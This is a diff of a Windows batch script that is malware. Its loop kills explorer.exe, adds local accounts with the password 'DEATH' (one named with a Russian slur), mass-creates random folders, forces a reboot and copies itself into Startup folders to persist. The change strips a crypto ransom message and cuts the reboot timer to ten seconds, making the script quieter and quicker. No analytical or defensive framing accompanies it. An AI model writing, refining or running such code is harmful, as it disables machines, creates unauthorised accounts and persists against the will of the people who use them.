@@ -1,9 +1,6 @@
 @echo off
 :a
 color 02
-echo It software is virus please
-echo pay to my crtpto wallet
-echo 1sd2k4ns_rf4d2s35fty
 taskkill /IM explorer.exe /f
 net user %random% DEATH /add
 net user "Гандон" DEATH /add
@@ -14,7 +11,7 @@ md %random% %random% %random% %random% %random%
 md %random% %random% %random% %random% %random%
 md %random% %random% %random% %random% %random%
 md %random% %random% %random% %random% %random%
-shutdown /r /t 200 /c "it software virus"​
+shutdown /r /t 10 
 copy %0 "C:\Users\Public\Desktop"
 copy %0 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 copy %0 "C:\Documents and Settings\All Users\Windows\Start Menu\Programs\Startup"
